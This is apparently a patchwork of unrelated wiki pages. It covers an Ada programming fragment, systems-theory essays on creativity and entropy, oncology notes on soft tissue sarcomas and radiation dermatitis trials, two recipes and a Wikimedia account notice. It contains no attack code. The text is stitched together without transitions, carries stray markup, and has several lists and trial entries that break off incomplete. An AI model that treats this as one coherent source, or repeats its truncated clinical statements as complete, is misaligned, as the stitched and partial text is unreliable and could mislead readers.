 {{Ada/kw|with}} {{Ada/package|Ada|Text_IO}};   {{Ada/kw|use}} {{Ada/package|Ada|Text_IO}};
 
 {{Ada/kw|procedure}} Hello {{Ada/kw|is}}
 {{Ada/kw|begin}}
    Put_Line(&quot;Hello, world!&quot;);
    New_Line;
    Put_Line(&quot;I am an Ada program with package use.&quot;);
 {{Ada/kw|end}} Hello;

If readability is your main concern then you should avoid this type of use clause. However it is needed to resolve a name clash between the packages which are imported and the package currently compiled.

=== At declaration level ===

== Creativity ==

The key work on Systems Theory in Creativity was done by [[Mihaly_Csikszentmihalyi]] (1988, 1999) in providing a model with which to explain how creative artifacts emerge from the system, which is a confluence model. Csikszentmihalyi's model incorporates three entities, the Individual, The Field and the Domain.

Creativity is a multidisciplinary, multifaceted concept that has held the interest of both theorists and practitioners over many years. It is perhaps more important today than ever before (Runco, 2004) because of the fast and complex changes that characterize the environment in which we live and operate. Some of the more fundamental changes are: 
a) globalization which, among other things, has introduced diversity in cultures and markets and exposed organizations to increased competitive pressure; 
b) technology advancements, particularly in communication, that have changed the means and the pace of information flow; 
c) organizational structures that are leaner and flatter, sometimes with part of the operations physically located on other continents; 
d) shift from manufacturing dominated to service dominated economies; 
e) markets that are more informed about products, available choices and civil rights. 

All these changes make obsolete the traditional ways of going about business and pose new challenges for decision makers. Individuals, firms and governments alike are must seek novel solutions to the challenges posed by the increasing dynamism and complexity of their environment. Creativity is the first step in the formulation of the novel solutions needed to counter these equally new situations. Indeed since the times of Graham Wallas and his work – Art of Thought - published in 1926, creativity has been recognized as a useful and effective response to evolutionary changes.

== Meaning and Scope ==

Being a multidisciplinary concept, creativity means different things to, and is expressed in different ways by different people. Organizational creativity is different from artistic creativity and both are different from clinical creativity. Emphases will also differ from one discipline to another. A psychiatrist’s interest in creativity will be different from that of a mathematician and both will differ from that of an organizational behaviorist.    Consequently, debates abound as to the origins, boundaries, processes and importance of creativity. For organizations and businesses however, the debates are only academic because of the role that creativity plays in innovation and entrepreneurship.
 
In organizations and businesses, creativity is the process through which new ideas that make innovation possible are developed (Paulus &amp; Nijstad, 2003). Additionally, at least for business organizations, creative ideas must have utility. They must constitute an appropriate response to a gap in the production, marketing or administrative processes of the organization. In this sense, creativity may be defined as the development of original ideas that have functional utility. The generation and development of original ideas is a complex process that has attracted research interest in several disciplines. The model first developed by Wallas in 1926 seems to have gained general acceptance, albeit with modifications over time. Without going into details, the model breaks down the creativity process into five stages namely: idea germination (or problem perception), knowledge accumulation (also called preparation or immersion), incubation, illumination (also called revelation or the Eureka stage) and verification (or evaluation).

There are other interesting perspectives about the meaning and scope of creativity. Only a few of them are mentioned here. First, understanding creativity as an aspect of problem solving seems to suggest that creativity is reactive. While this is true – creativity responds to new demands occasioned by changes that have become part of organizational life – creativity is also proactive (Heinzen, 1994). Understanding creativity as the development of new ideas that have utility pits the concept in a dual role of problem solving and problem finding (Runco, 2004). As developments in the communication industry demonstrate, creativity has a role to play in initiating change and evolution in organizations. Second, whereas originality is necessary, it is not sufficient for creativity. Unless an idea is useful to someone and can be replicated, it is only just that – a bright idea (Drucker, 1994). In addition, originality does not imply that creative ideas are always radical deviations of present day applications. Inventions are momentous when they are introduced on the market but there are very few radical inventions and far between. In many cases creative ideas that result in innovations are a reformulation of existing ideas that makes them more versatile, user-friendlier or just less costly to produce and dispense. Third, creativity is intricately linked to innovation and entrepreneurship (Kao, 1989). Creativity envisions what is possible and is more conceptual than practical. Innovation and entrepreneurship complete the cycle by applying the results of the creative process to economic or social advantage. Fourth, a distinction needs to be made between talent creativity – like that possessed by artists and performers – and self-actualizing creativity (Maslow, 1971) that is deliberately developed for problem solving and competence enhancing. The point here is that creative ability is a process of nature and nurture. Some may have a natural flair for creative thinking while for others it lies latent and must de deliberately developed. Fifth, apart from the categorization along the disciplinary divide, creativity may also be discussed under an alliterative scheme adopted by Runco from Rhodes (1987). The scheme distinguishes between the creative person, process, product and pressures (press) on creative persons or creative processes.

== Drivers ==

Factors that enhance creativity in individuals or organizations may be divided into two categories - personal and environmental. Personal characteristics that enhance creative ability include high evaluation of aesthetic qualities, having broad interests, curiosity and a penchant for discovery, openness to suggestion, attraction to complexity, having independence of judgment thought and action, a love for autonomy, intuition, self-confidence, ability to accommodate ambiguity and to resolve antinomies, intrinsic motivation and a firm belief in self as a creative person.

Environmental factors examine the context in which creative ability is nurtured and in which creative action is required. In an individual’s formative stages, family background and structure (Sulloway, 1996), societal norms and values, social institutions such as schools, religion, role models and peer groups all play a role in the nurturing of creative ability. Contexts that are flexible about rules and regulations, permitting experimentation and independent choices will enhance creativity. Those that are rigid will inhibit it.  In the organizational context, situations that avail time to think, resources to spend, encouragement and reward for original solutions, freedom from criticism and that have good role models and norms in which innovation is prized and failure is not fatal, will enhance creativity.

== Inhibitors ==

Among the factors that inhibit creative ability in individuals and organizations are a population that is not curious or inquisitive and unwilling or unable to question assumptions, resistance to change and tendency to conform, fear of failure and criticism, red tape, time pressure (time is important for new ideas to incubate), lack of feedback, inappropriate norms and values, strict adherence to rules, regulations and budgets, an atmosphere characterized by constraint and lack of autonomy, blinked thinking and unrealistic expectations, over analysis of phenomenon (resulting in paralysis), organizational structures that constrain the flow of ideas, lack of recognition and reward for successful ideas, short term orientation and departmental actions that fail to take into account the bigger picture (functional myopia).

There are also a number of factors that may work both ways - that may stimulate or inhibit creativity. Among these are: lack of resources – ideas require extensive resources to be developed but paucity may in itself be an incentive for creativity (Runco, 2004); competition may also act in both directions – it may stimulate creativity to maintain a competitive edge but it may also discourage creative effort by making obsolete innovations before they are able to recoup expenditure on their development. 

== The Dark Side ==

While creativity has been associated with problem solving and value enhancing through proactive actions, it has also been linked with potential costs to the individual and to the society at large. For example, creative geniuses have been associated with various disorders including madness and eccentricity (Ludwig 1995), alcoholism (Noble et al 1993) and stress (Carson and Runco, 1999). Runco (1999) suggested that because creativity is strongly linked to originality it is a kind of social deviance. Plucker &amp; Runco (1999) and Runco (1999) observed that there is frequent stigma attached to creativity. Before these, McLaren (1993) made the observation that it is the dark side of creativity has given the world weapons of mass destruction and other evil inventions and techniques. It would of course be naïve to conclude that creative persons are mad, social deviants or terrorists from such correlations.

&lt;big&gt;'''Soft Tissue Sarcoma'''&lt;/big&gt;

*Described originally by ancient Greek physicians, the term comes from ''sarx'', meaning “flesh”


==Incidence==
*0.66% of adult cancer cases (8100 cases/yr)
**15% of patients are &lt;16 years old, 40% are &gt;40
**6.5% of pediatric cancers
*Deaths: 4,600 cases/yr, about 50%
**5th most common cause of death in children under 15 yrs

==Etiology==
*Arise from primitive mesenchyme of the mesoderm, which gives rise to muscle, fat, fibrous tissues, blood vessels, and supporting cells of the peripheral nervous system
*Most are sporadic. Familial inheritance pattern may be found in:

**Most common types are malignant fibrous histiocytoma, fibrosarcoma, and malignant nerve sheath tumor
*Environmental: vinyl chloride, phenoxyacetic acid, arsenic - hepatic angiosarcomas.  Increased incidence found in gardeners (phenoxy herbicides), railroad workers, construction workers exposed to impregnating agents
*May be observed in the setting of chronic massive edema (e.g. [[w:Stewart-Treves_syndrome|Stewart-Treves Syndrome]])
*Rare cases have also been observed in scar tissues after surgery, burn, or foreign body implants

===Fibrous Tumors===
*Please see the [[Radiation Oncology/Sarcoma/Fibrosarcoma|Fibrosarcoma]] page for more detail

===Fibrohistiocytic Tumors===
*Historically believed to come from histiocytes, but likely fibroblastic in origin
*Fibrous histiocytoma: benign, typically solitary, slow-growing nodules. Fibroblasts and histiocytes. In skin called dermatofibroma. Treated by simple excision or wide local excision to prevent local recurrence
*Xanthoma: histiocytes full of lipid; associated with hyperlipidemia, and usually manifested in skin though may involved deep tissues as well
*[[Radiation_Oncology/Sarcoma/DFSP|Dermatofibrosarcoma protuberans]]: low-grade cutaneous sarcoma
*High-grade undifferentiated pleomorphic sarcoma: 
**Historically called Malignant Fibrous Histiocytoma (MFH)
**Group of malignant soft tissue tumors, with several subtypes. There is some evidence MFH may be the final undifferentiated stage for sarcoma of various differentiation lines. 
**Most commonly diagnosed extremity sarcoma
**Presents as painless mass
**Please see below for treatment approaches

===Adipose Tumors===
*Lipoma: most common benign soft tissue neoplasm. Subcutaneous tissues of trunk and proximal limbs (thighs). Frequently solitary, slow-growing, and painless. Local excision, with recurrence &lt;2%
*Angiomyolipoma: renal tumor composed of fat, smooth muscle, and blood vessel. Presents with pain or hematuria. Does not metastasise. May be associated with tuberous sclerosis. Wide local excision
*Liposarcoma:
**Mostly in adults. ~20% of soft tissue sarcomas
**May occur anywhere, though most common locations are [[Radiation_Oncology/Sarcoma/Retroperitoneal_sarcoma|retroperitoneum]] and thigh
**Three primary histologies:
***Atypical lipomatous tumor: Deep-seated, painless, enlarging mass. Typically mature adipocytes, although ~10% can become dedifferentiated. The low grade mature adipocyte lesions have a low rate of lymph node involvement and distant metastases. The dedifferentiated lesions are more aggressive (5-year DSS 20%, local failure 80%, and distant mets 30%), especially if located in the retroperitoneum
***Myxoid liposarcoma: ~40% of liposarcomas. Typically extremities, particularly thigh. t(12;16) translocation resulting in fusion protein TLS-CHOP in &gt;90%. Proportion of tumor containing round cells determines grade, which has impact on survival (5-year OS &lt;5% round cell 90% vs &gt;5% round cell 50%). Respond well to RT
***Pleomorphic liposarcoma: highly undifferentiated, high metastatic potential, rapid death

===Smooth Muscle Tumors===
*Leiomyoma: Mostly in uterus, GI tract, and extensor surfaces of extremities. Painful, frequently multiple. Histologically benign. May have high recurrence rate after surgery
*Leiomyosarcoma:
**Smooth muscle cells staining for desmin and actin. Grading can be difficult, and mitotic activity is used
**Mostly arise as [[Radiation_Oncology/Uterine_Sarcoma|uterine sarcoma]] or as [[Radiation_Oncology/Sarcoma/Retroperitoneal_sarcoma|retroperitoneal sarcoma]], though can arise in any location
**Subcutaneous LMS presents as small nodules, and has much better prognosis

===Skeletal Muscle Tumors===
*Please see the [[Radiation_Oncology/Rhabdomyosarcoma|Rhabdomyosarcoma]] page

===Vascular Tumors===
*Hemangioma: Most present at birth, and regress spontaneously. If rapid growth occurs, intralesional injection with interferon
*Lymphangioleiomyomatosis (LAM): Progressive infiltration of lungs by smooth muscle cells. Predominately in younger women. Efforts to treat it with lung transplant
*[[Radiation_Oncology/Kaposi%27s_sarcoma|Kaposi's Sarcoma]]
*[[Radiation_Oncology/Sarcoma/Angiosarcoma|Angiosarcoma]]
*[[Radiation_Oncology/Sarcoma/Hemangiopericytoma|Hemangiopericytoma]]
*[[Radiation_Oncology/Sarcoma/Hemangioendothelioma|Hemangioendothelioma]]

===Synovial Tumors===
*Nodular Tenosynovitis: Giant cell tumor, commonly seen in women, age 30-50. Frequently in hand, but also ankles and knees. Slow-growing tumors. Due to location, excision often has close margins, and local recurrence 10-20%
*[[Radiation_Oncology/Benign/PVNS|Pigmented Villonodular Synovitis]]
*[[Radiation_Oncology/Sarcoma/Synovial_Sarcoma|Synovial sarcoma]]

===Peripheral Nerve Tumors===
*Neurofibroma: Small, slowly growing, cutaneous or subcutaneous nodules. May be painful. Associated with NF1. Plexiform neurofibromas may affect larger segments of nerve, causing dysesthetic pain. Sometimes difficult to differentiate from MPNST
*Benign schwannoma (neurilemoma): Slowly growing. Usually encapsulated, containing an ordered cellular region (Antoni A) and a myxoid component (Antoni B). Frequently a painless vertebral mass in the retroperitoneum, also in H&amp;N, and flexor surfaces of the extremities. Treated with surgical resection
*[[Radiation_Oncology/MPNST|Malignant peripheral nerve sheet tumor]]

===Uncertain Histogenesis===
*Myxoma: Typically occurs in large muscles of the extremities. Abundant mucoid material with few cells.
*Alveolar soft part sarcoma: Slow-growing, painless mass, typically in lower extremities. Poorly circumscribed; alveolar spaces are areas of necrosis. Poor prognosis. Essentially no response to chemotherapy
*Clear cell sarcoma of the tendons and aponeuroses (melanoma of soft parts): more common in young women. Poor prognosis. High grade. Appears morphologically and behaviorally similar to melanoma, but it has a distinct translocation
*Desmoplastic small round cell tumor: Diffuse peritoneal implants. Small round blue cells, fibrosclerotic stroma. Co-express epithelial, mesenchymal, myogenic, and neural markers, with t(11;22) translocation. Poor prognosis (3-year OS 30%)
*Follicular dendritic cell sarcoma: Follicular dendritic cells that present antigens to B-cells in a lymph node. Surgery primary approach. High rate of recurrence.

==Patterns of spread==
*Lymph nodes
**~5% have positive lymph nodes at presentation (PMID 3308055)
**Increased risk in clear cell sarcoma (28%), angiosarcoma (23%), epithelioid sarcoma (20%), rhabdomyosarcoma (15%), synovial sarcoma (14%). (Mnemonic: '''SCARE''' for synovial, clear cell, angio, rhabdo, epithel.)
**However, recent studies on [[Radiation_Oncology/Sarcoma/Synovial_Sarcoma|synovial sarcoma]] show only 1-3% rate of LN failure, and radiation of regional LNs may no longer recommended
*Distant metastases
**~10% have distant mets at presentation
**Extremity sarcomas most commonly spread to lung (70-82% experience lung mets as first metastatic site); ~80% of distant mets appear within 2 years
**Retroperitoneal sarcomas spread frequently to liver (liposarcoma spreads to nonpulmonary sites in 59% of metastases)

[[File:Tortilla patatas.jpg|right|thumb|250px|Spanish Omelet]]
The Spanish tortilla is one of the best-known Spanish dishes, and it would be very rare to find a tapas bar that does not offer the Spanish tortilla.  This tapa is versatile, and other ingredients such as mushrooms, tomatoes, and peppers can be added to create variety.  The Spanish tortilla can be served warm or cold, and is often topped with mayonnaise or tomato sauce.

==Ingredients==
*1[[Cookbook:Pound|lb]]/450[[Cookbook:g|g]] waxy [[Cookbook:Potato|potatoes]]
*1 large white/Spanish [[Cookbook:Onion|onion]] (optional)
*About 1 [[Cookbook:L|liter]] of [[Cookbook:Oil|oil]] - ''Olive oil is best''
*6 [[Cookbook:Egg|eggs]]
*pinch [[Cookbook:Salt|salt]]

== Procedure ==
#Peel and slice potatoes. The slices should be quite thin.
#Meanwhile, heat the oil on a low heat in a large [[Cookbook:Sauté Pan|sauté pan]]
#Add the potatoes to the sauté pan, and fry until soft and cooked through, but '''not browned'''. This can take quite a while - don't rush it. It is a good idea to keep the pan covered - that way the steam from the potatoes at the bottom of the pan helps cook the ones at the top.
#Slice the onion thinly. [[Cookbook:Frying|Fry]] it lightly in [[Cookbook:Frying Pan|frying pan]], stirring frequently for a few minutes or until sweet. Or you can simply add them to the potatoes for the last five minutes of cooking.
#Beat the eggs in a large bowl and add salt
#Add the hot cooked potatoes and onion to the egg in the bowl, gently mix the potatoes and onion into the egg and leave it for five minutes. This starts the egg cooking and helps cover the potato slices in egg so it all sticks together nicely.
#Drain oil, and reserve oil for another time.
#Pour the potatoes, onion and egg mix back into the pan, and cook for about 5 minutes on a low heat. Keep the pan moving so the mix doesn't stick to the pan. A non-stick pan makes this much easier.
#When the edge of the tortilla looks cooked place a large, flat plate over the pan (like a lid), put one hand on the plate to hold it in place and turn the whole thing over (the first few times you do this it is best do this over the sink - can be very messy)
# You should now have an up-side-down omelette on your plate - cooked on top - raw underneath. Check the pan is clean and scrape any bits that have stuck in the pan off and add a bit of oil if it is looking dry. Now slide the omelette back into the pan to cook the bottom.
#Cook for another few minutes,
#Repeat the turning trick a couple of times (practice makes perfect) to make sure it is cooked evenly.
#Then serve onto large plate, cut into wedges, and serve with more [[Cookbook:Tapas|tapas]]. Sliced tomatoes, fresh bread and mayo make it into a great meal.

A '''funnel''' is a conical utensil with a wide opening at one end that tapers down to a narrow (almost cylindrical) tube at the other. It is generally used to transfer ingredients from larger to smaller containers. Usually liquids or small solids.

These cookies can be considered '''gingerbread cookies''', and originally were named as such. They resemble the '''molasses cookies''' made by Archway; they use relatively little [[Cookbook:Ginger|ginger]] and are thus not as spicy hot as gingerbread cookies from many other recipes. They are usually somewhat soft and not at all gooey, being halfway between crumbly and chewy. They are generally not crisp, but can be slightly crisp if thoroughly cooked. The recipe works for both drop cookies and rolled cookies, with a bit of adjustment to the amount of flour.

The known history of this recipe starts from eavesdropping on a party-line telephone during the early 1900s. The age of this recipe appears to explain many odd features. At the time, [[Cookbook:Baking Powder|baking powder]] did not exist. Thus this recipe uses [[Cookbook:Baking Soda|baking soda]], with [[Cookbook:Milk|sour milk]] (now created via [[Cookbook:Vinegar|vinegar]], so don't panic) as the acid. Ginger would have been expensive. The recipe originally called for an undefined amount of [[Cookbook:Flour|flour]] that turned out to be around 8 [[Cookbook:Cup|cups]] (1/2 [[Cookbook:Gallon|gallon]]), which would feed a family of a dozen or so. The recipe has been cut in half for the benefit of less-productive parents.

==Ingredients==

[[Image:Molasses-Cookies-2006March09.JPG|thumb|right|200px|Molasses cookies made from this recipe.]]

*1/2 [[Cookbook:Tablespoon|tablespoon]] [[Cookbook:Vinegar|vinegar]]
*1/2 [[Cookbook:Cup|cup]] [[Cookbook:Milk|milk]] (minus 1/2 tablespoon for the vinegar)
*1/2 cup [[Cookbook:Sugar|sugar]]
*1/2 cup [[Cookbook:Shortening|shortening]] (see ''variation'' below if substitution is desired)
*1 [[Cookbook:Egg|egg]]
*1 cup [[Cookbook:Molasses|molasses]]
*4 cup [[Cookbook:Flour|flour]] (approximate upper limit; see instructions below)
*2 [[Cookbook:Teaspoon|teaspoon]] [[Cookbook:Baking Soda|baking soda]]
*1/4 teaspoon [[Cookbook:Cinnamon|cinnamon]]
*1/4 teaspoon [[Cookbook:Ginger|ginger]]
*toppings: [[Cookbook:Walnut|walnuts]], [[Cookbook:Raisin|raisins]], etc.

==Procedure==

[[Image:Molasses-Cookies-In-Progress-2006March09.JPG|thumb|right|200px|In progress: the drop variety, with about 3c flour total, being pressed with a sugar-covered clay stamp.]]

#Grease some [[Cookbook:Cookie Sheet|cookie sheets]].
#Prepare 3 mixtures:
#*the vinegar, plus enough milk to make 1/2 cup (alternately, use real sour milk)
#*the baking soda, cinnamon, ginger, and 2.5 cups (not all 4 cups) of flour
#*the sugar and shortening creamed together, then also adding in the egg and molasses (use a large bowl)
#To the sugar+shortening+egg+molasses mixture, alternately mix in small amounts of the other two mixtures until everything is in one bowl. Mix this well.
#Bit by bit, mix in more flour as needed. For drop cookies, you might not add any more. For rolled cookies produced without refrigeration, you are likely to need an extra 1.5 cup for a total of 4 cups. Refrigeration can reduce this slightly.
#Form the cookies
#*If making drop cookies, plop some batter onto a cookie sheet. Using a bit of sugar to prevent sticking, squish the cookie with a glass. Push some walnut pieces into the top of the cookie.
#*If making rolled cookies, you may wish to refrigerate the batter. Plop a [[Cookbook:Pint|pint]]-sized blob of batter onto a flour-dusted surface. Dust the top of the dough with flour as you squish it down, then roll it out. A cold marble [[Cookbook:Rolling Pin|rolling pin]] is suggested. Cut out shapes, then place them on the cookie sheet. The unused dough may be put back into the mix; note that this increases the proportion of flour.
#Cook for 8 to 10 minutes at [[Cookbook:Oven_temperatures|375°F]]

==Variation==
[[Cookbook:Butter|Butter]] seems to work OK in place of the [[Cookbook:Shortening|shortening]], with a bit of heating to soften it up. In a 1-[[Cookbook:Pound|pound]] package with 4 sticks, 1 stick is about 1/2 cup. [[Cookbook:Lard|Lard]] should be an even better substitute.

&lt;div class=&quot;plainlinks mw-content-ltr&quot; lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;
Hello,

The developer team at Wikimedia is making some changes to how accounts work, as part of our on-going efforts to provide new and better tools for our users like cross-wiki notifications. These changes will mean you have the same account name everywhere. This will let us give you new features that will help you edit and discuss better, and allow more flexible user permissions for tools. One of the side-effects of this is that user accounts will now have to be unique across all 900 Wikimedia wikis. See [[m:Special:MyLanguage/Single User Login finalisation announcement|the announcement]] for more information.

Unfortunately, your account clashes with another account also called Rainbird. To make sure that both of you can use all Wikimedia projects in future, we have reserved the name Rainbird~enwikibooks that only you will have. If you like it, you don't have to do anything. If you do not like it, you can [[Special:GlobalRenameRequest|pick out a different name]].

Your account will still work as before, and you will be credited for all your edits made so far, but you will have to use the new account name when you log in.

Sorry for the inconvenience.

Yours,&lt;br /&gt;[[m:User:Keegan (WMF)|Keegan Peterzell]]&lt;br /&gt;Community Liaison, Wikimedia Foundation

      <text xml:space="preserve">{{Systems Theory Page}}

== Energy – From Physics to Organizations ==

The First Law of Thermodynamics states that energy can not be created or destroyed. All energy present in the universe (the largest system we know) simply changes forms throughout the cycles and phases of the system. When we observe a component of the system losing energy, we are observing a displacement of the energy’s location. The energy that was once localized to a specific entity, group, business or person will eventually disperse into the surrounding system.

Example: A hammer is swung with kinetic energy to drive a nail into a piece of wood. When the nail is struck, the hammer’s energy is transferred to the nail. The nail then uses its kinetic energy to move into the wood. The wood uses its potential energy to push back against the nail until the nail no longer continues to move. Excess energy produces heat and sound during the hammering. 

In this small system, energy only changes form and location, but is never created or destroyed. If we were to expand the system, we would see that the kinetic energy in the hammer came from the kinetic energy in the hammerer’s arm. This kinetic energy came from the chemical energy gained from ingesting food. The food’s chemical energy came from the chemical bonds formed in the presence of solar energy. In physics, the changes in the location and form of energy is the mechanism that connects the universe as a very large system. Energy flows through other systems as well. In social organizations, energy is often described in various other terms (people, money, products, information or capital)  but still flows in a similar manner.*
 
Example: A company’s success in bill collecting is declining because the amount of collection calls per week has diminished. The bill collector has been searching for a new job during their working hours. The energy that the collector normally put into calling clients is now being used to conduct personal business. In this example, the energy inputs (40 hours per week from the collector) have remained the same, however, the energy is being dispersed from the company’s system to the collector and other businesses’ systems.

== Entropy Defined ==

Entropy is a tendency for a systems’ outputs to decline when the inputs have remained the same. Most often associated with the Second Law of Thermodynamics, entropy measures the changes in the type and dispersion of energy within an observable system. We measure entropy in a systems thinking by the change in outputs when the inputs have remained the same. Thus, entropy is a direct function of time (temporal).**

== Closed Systems and Scope ==

Entropy occurs in closed systems where only the outputs decline. The system appears closed because the observed scope of the system displays no changes in the normal processes or actions that continue to take place. 

Example: An organization manufactures ocean-worthy sailing ships for transportation. The organization has reported fewer revenues every year since the late 1800’s. The inputs (labor, skill, tools and capital) have remained the same throughout the years, however, sales have dropped (no pun intended) due to entropy. Without changes in inputs   (creativity, modernism, or market observance) the system is considered closed, and entropy becomes inevitable.

In this example, the success of the transportation industry is not declining, only the success of one organization. Through more convenient transportation, the success of large sailing ships is being transferred from the local environment to the global market. The trans-oceanic travel is still needed, but due to a closed and entropic system, the sailing boat organization will no longer be successful. This organization failed to consider that they are part of a larger system, and must evolve over time. The scope of the system and the complexity greatly effect the length of time in which entropy typically occurs.

Example: A neighborhood child opens a lemonade stand. The lemonade remains the same, and after one month, the sales of lemonade decline as the neighborhood consumers want variety. Entropy within this system sets in quickly. An international soft-drink company that chooses to no longer manufacture more than one type of beverage could similarly fall victim to entropy.

== Combating Entropy ==

Living organisms are often affected by diseases. These diseases represent external and internal threats that degenerate the organism until it no longer can sustain life. We challenge this form of organic entropy by adding inputs (white blood cells, medications, nutrients, etc.). Thus, organisms continue to exist through a spontaneous changes in the inputs and structures of the processes.***

Once social organizations reach a state of static equilibrium, entropy begins to occur. The degradation of the system unit of entire system is then only a function of time. This unintended process occurs until the system is thrown out of its static state with new inputs or process changes, or the system fails. To challenge the onslaught of entropy, system thinkers are required to continuously expand their knowledge of the scope and complexity of their system. Once they can identify a way for the component or process to evolve, the risk of entropy is lessened. After new actions are taken or inputs are changed, the process to avoid system decline due to entropy begins again. Once growth has stopped, the decline of the system is inevitable.

* Although the concepts of people, money, products, information, or capital can be created and destroyed, the flow, organization, and displacements of these components are treated like energy for the discussion of organizational entropy.

**Not to confuse physics and systems science: In systems science, entropy is measured by change in outputs over time. In physics, entropy is measured by change in temperature over time.

*** Nobel laureate Ilya Prigogine first described that living systems continuously renew themselves through a process of &quot;spontaneous structuration&quot; which occurs when they are jarred out of a state of equilibrium.

==Skin Fibrosis==
*'''Montpellier; 2008''' (France) PMID 18211604 -- &quot;A randomized, prospective study using the LPG((R)) technique in treating radiation-induced skin fibrosis: clinical and profilometric analysis.&quot; (Bourgeois JF, Skin Res Technol. 2008 Feb;14(1):71-6.)
**Randomized. 20 women, s/p BCS + RT 6-16 months prior. Arm 1) LPG((R)) massage vs. Arm 2) observation
**Outcome: LPG massage improved erythema, decreased pain and pruritus, decreased feeling of induration, and improved skin softness
**Conclusion: Improvement after clinical signs after LPG massage


==Acute Dermatitis==
*Acute dermatitis was described as early as 1924, and was initially used to guide dosimetry
*Severe skin reactions typically happen where skin rubs together (e.g. inframammary fold, neck, groin, perineum) or where there are dosimetric hotspots. The hotspots may be deeply subcutaneous, as described by Pignol in their breast IMRT trial correspondence (PMID 18591570)
*The prevalence of moist desquamation is 30-50%, and may be as high as 60% in patients treated for nasopharyngeal cancer
*Risk factors include smoking, use of bolus, and concurrent chemotherapy
*For many decades, skin washing during RT was forbidden. Randomized evidence showed that skin washing is not harmful, and may be beneficial
*A number of randomized studies evaluated prophylactic use of creams and lotions, but none were overwhelmingly positive
*It is probably reasonable to use moisturizing creams such as Aloe Vera or Aquaphor (these were the most commonly used products in RTOG 97-13) in Grade I-II dermatitis. For Grade III-IV dermatitis, use of non-adherent absorbent dressings may be considered 
*Hydrogel dressing have resulted in prolonged healing time, with no benefit for symptomatic relief, and should not be used
*For breast irradiation, axillary deodorant use is comparable in toxicity to no use, and should not be discouraged
*For cranial irradiation, routine hair washing does not influence development of skin toxicity, and probably should not be discouraged


===Axillary deodorant===
*'''Quebec; 2009''' PMID 19327906 -- &quot;Use of axillary deodorant and effect on acute skin toxicity during radiotherapy for breast cancer: a prospective randomized noninferiority trial.&quot; (Theberge V, Int J Radiat Oncol Biol Phys. 2009 Nov 15;75(4):1048-52. Epub 2009 Mar 26.)
**Randomized, non-inferiority trial. 84 patients with breast RT. Arm 1) deodorant use vs. Arm 2) no deodorant. 
**Outcome: Grade 2 axilla dermatitis deodorant 23% vs. no deodorant 30% (NS); Grade 2 breast dermatitis 30% vs. 34% (NS); no Grade 3+ dermatitis. Sweating deodorant 18% vs no deodorant 39% (SS)
**Conclusion: No evidence to prohibit deodorant use during breast RT

===APP cream===
*'''St. Jude's; 2007''' PMID 18093332 -- &quot;A phase III trial comparing an anionic phospholipid-based cream and aloe vera-based gel in the prevention of radiation dermatitis in pediatric patients.&quot; (Merchant TE, Radiat Oncol. 2007 Dec 19;2:45.)
**Randomized. 45 patients, irradiated to at least 23.4 Gy (mean 34 Gy), age &gt;3 years. Two creams applied to each patient by nursing staff, site randomly chosen prior to treatment. Arm 1) anionic polar phospholipid (APP) based cream (made by Ocular Research of Boston, Boston, MA) vs. Arm 2) aloe vera-based cream
**Outcome: Grouped scores better for APP cream. Dryness and peely skin also better for APP cream
**Conclusion: APP cream is more effective than aloe-vera based gel

===Hydrogel (moist) dressing===
*'''Edinburgh; 2007''' (UK) PMID 17363185 -- &quot;Randomized comparison of dry dressings versus hydrogel in management of radiation-induced moist desquamation.&quot; (Macmillan MS, Int J Radiat Oncol Biol Phys. 2007 Jul 1;68(3):864-72. Epub 2007 Mar 23.)
**Randomized. 357 patients with breast (63%), H&amp;N (30%) or anorectal CA. Arm 1) simple dry dressings vs. Arm 2) hydrogel (Intrasite). Started using from onset of moist desquammation. Prevalence of moist desquammation 28%, mean 32 days after starting treatment
**Outcome: Time-to-healing significantly worse. No impact on subjective symptoms (pain, burning, sleep). Compliance significantly better with hydrogel dressing (93% vs. 63%)
**Conclusion: Hydrogel dressing are worse than dry dressings, with prolonged healing time

*'''Prince of Wales; 2000''' (Hong Kong) PMID 10851773 -- &quot;The effects of hydrocolloid dressing and gentian violet on radiation-induced moist desquamation wound healing.&quot; (Mak SS, Cancer Nurs. 2000 Jun;23(3):220-9.)
**Randomized. 39 patients, 60 moist desquamation wounds. Arm 1) hydrocolloid (moist) dressing vs. Arm 2) gentian violet (control).
**Outcome: No difference between the groups; substantially worse patient satisfaction with gentian violet due to discoloration and drying
**Conclusion: No difference; patients should decide which they prefer

===XClair===
*'''Rome; 2006''' PMID 16980242 -- &quot;A double-blind, vehicle-controlled clinical study to evaluate the efficacy of MAS065D (XClair), a hyaluronic acid-based formulation, in the management of radiation-induced dermatitis.&quot; (Primavera G, Cutan Ocul Toxicol. 2006;25(3):165-71.)
**Randomized. Patients with BCA. Arm 1) control vs. Arm 2) Xclair
**Outcome: Xclair significantly better for radiation dermatitis and erythema. No difference in pain and itch. Both patients and investigators preferred Xclair
**Conclusion: Xclair can be an effective option for managing radiation dermatitis

**Randomized. 60 patients with BCA treated with 50/25, randomized to beclomethasone spray to irradiated axilla vs. observation
**Wet desquammation: beclomethasone spray 13% vs. observation 37% (SS)
**Conclusion: topical steroid during RT reduces risk of wet desquammation

===Calendula===
*'''Lyon; 2004''' (France)(1999-2001) PMID 15084618 -- &quot;Phase III randomized trial of Calendula officinalis compared with trolamine for the prevention of acute dermatitis during irradiation for breast cancer.&quot; (Pommier P, J Clin Oncol. 2004 Apr 15;22(8):1447-53.)
**Randomized. 254 patients with BCA. Arm 1) Biafine (control) vs. Arm 2) [[w:calendula|calendula]]. 
**Outcome: Grade 2+ acute dermatitis calendula 41% vs. Biafine 63% (SS); also less frequent interruption of RT. Calendula more difficult to apply but self-assessed satisfaction greater
**Conclusion: Calendula highly effective for prevention of acute Grade 2+ dermatitis

===Theta-Cream===
*'''Munich; 2004''' (Germany)(2002) PMID 15127162 -- &quot;Thêta-Cream versus Bepanthol lotion in breast cancer patients under radiotherapy. A new prophylactic agent in skin care?&quot; (Roper B, Strahlenther Onkol. 2004 May;180(5):315-22.)
**Randomized. 20 patients with BCA. Arm 1) Theta-Cream vs. Arm 2) Bepanthol lotion (control). Evaluated by modified RTOG criteria and photography

===Nonadherent Dressings===
*'''Prince of Wales; 2005''' (Hong Kong)(2001-2003) PMID 16330964 -- &quot;A comparison of wound treatments in nasopharyngeal cancer patients receiving radiation therapy.&quot; (Mak SS, Cancer Nurs. 2005 Nov-Dec;28(6):436-45.)
**Randomized. 146 patients with nasopharyngeal CA, who developed moist desquammation. Arm 1) nonadherent absorbent dressings vs. Arm 2) gentian violet (control). Daily cleansing with 0.9% saline. Evaluated wound healing, presence of infectin, social isolation, sleep, neck mobility
